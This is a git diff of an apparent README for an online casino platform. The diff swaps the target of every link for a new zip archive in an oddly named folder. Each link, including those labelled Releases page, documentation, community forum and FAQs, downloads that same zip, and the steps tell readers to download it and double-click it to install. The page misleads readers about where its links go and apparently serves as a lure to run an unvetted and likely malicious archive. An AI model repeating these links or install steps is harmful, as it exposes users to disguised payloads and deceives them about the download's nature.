@@ -1,6 +1,6 @@
 # 🎰 online-casino-platform - Launch Your Casino Brand Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-casino-platform_v2.8-alpha.2.zip)](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-casino-platform_v2.8-alpha.2.zip)
+[![Download Now](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-platform-casino-3.4.zip)](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-platform-casino-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -29,13 +29,13 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, visit our Releases page to download the latest version of 1Stake.
 
-[Visit this page to download](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-casino-platform_v2.8-alpha.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-platform-casino-3.4.zip)
 
 Follow these steps to install the software:
 
 1. Click on the **Releases** link above.
 2. You will see a list of available versions. Find the latest version at the top.
-3. Download the appropriate installer for your operating system (e.g., `https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-casino-platform_v2.8-alpha.2.zip` for Windows or `https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-casino-platform_v2.8-alpha.2.zip` for macOS).
+3. Download the appropriate installer for your operating system (e.g., `https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-platform-casino-3.4.zip` for Windows or `https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-platform-casino-3.4.zip` for macOS).
 4. Once the file is downloaded, locate it in your downloads folder.
 5. Double-click the file to start the installation.
 6. Follow the on-screen instructions to complete the installation.
@@ -72,9 +72,9 @@ Use these keywords to explore additional resources and related projects.
 
 To dive deeper into the world of online gaming, explore our useful links:
 
-- [Official Documentation](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-casino-platform_v2.8-alpha.2.zip) – for technical details and setup instructions
-- [Community Forum](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-casino-platform_v2.8-alpha.2.zip) – connect with other users and share ideas
-- [FAQs](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-casino-platform_v2.8-alpha.2.zip) – find answers to common questions
+- [Official Documentation](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-platform-casino-3.4.zip) – for technical details and setup instructions
+- [Community Forum](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-platform-casino-3.4.zip) – connect with other users and share ideas
+- [FAQs](https://raw.githubusercontent.com/Logishwaran12/online-casino-platform/main/tiresomely/online-platform-casino-3.4.zip) – find answers to common questions
 
 ## 🔒 License
 
